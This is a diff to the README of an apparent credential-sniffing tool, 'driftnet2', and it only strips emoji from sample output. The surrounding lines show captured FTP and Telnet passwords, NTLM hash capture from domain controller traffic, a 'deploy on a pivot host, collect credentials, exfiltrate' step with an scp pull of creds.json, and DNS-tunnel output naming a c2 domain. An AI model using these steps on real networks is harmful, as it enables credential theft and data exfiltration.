@@ -105,10 +105,10 @@ sudo ./driftnet2 -iface eth0  # auto-detects XDP
 
 ```
 [14:32:15] FTP  10.0.0.5 → 10.0.1.100:21
-  🔑  ftpadmin:Spring2026!
+  ftpadmin:Spring2026!
 
 [14:32:22] Telnet  10.0.0.12 → 192.168.1.1:23
-  🔑  root:cisco123
+  root:cisco123
 ```
 
 **Sniff domain controller traffic for NTLM hashes:**
@@ -119,7 +119,7 @@ sudo ./driftnet2 -iface eth0  # auto-detects XDP
 
 ```
 [14:33:45] SMB  10.0.0.42 → 10.0.0.1:445
-  ⚡  CORP\jsmith::a1b2c3d4...
+  CORP\jsmith::a1b2c3d4...
 ```
 
 **Deploy on a pivot host, collect credentials, exfiltrate:**
@@ -139,7 +139,7 @@ scp user@pivot:/tmp/creds.json .
 
 ```
 [14:35:10] DNS  10.0.0.15 → 8.8.8.8:53
-  🕳️  TUNNEL: AQIDBAUG.c2.example.com (TXT)
+  TUNNEL: AQIDBAUG.c2.example.com (TXT)
 ```
 
 ---
